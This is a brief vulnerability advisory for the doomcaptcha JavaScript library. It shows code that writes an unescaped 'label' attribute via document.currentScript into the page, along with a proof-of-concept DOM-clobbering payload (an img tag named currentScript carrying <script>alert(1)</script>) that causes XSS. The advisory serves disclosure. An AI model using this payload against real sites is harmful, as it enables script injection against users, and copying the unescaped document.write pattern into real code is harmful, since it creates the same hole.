## doomcaptcha

### Meta

+ Library: doomcaptcha
+ Stars: 1K
+ Version: latest
+ Payload: ```<img name="currentScript" label="<script>alert(1)</script>"></img>```
+ Impact: XSS
+ CVE: N/A
+ Status: Mitre
+ Foundby: TheHulk

### Library

URL:
+ `https://github.com/vivirenremoto/doomcaptcha/blob/main/script.js`

### Vulnerable Code Snippet

```javascript
var captcha_label = document.currentScript.getAttribute('label');

var captcha_html = '';
if (captcha_label) {
    captcha_html = '<p>' + captcha_label + '<br>';
}

document.write(captcha_html);
```

## PoC

``` html
<!--Library-->
<form>
<script src=script.js></script>
</form>
<!--Library-->

<!--Payload-->
<img name=currentScript label="<script>alert(1)</script>"></img>
<!--Payload-->
```
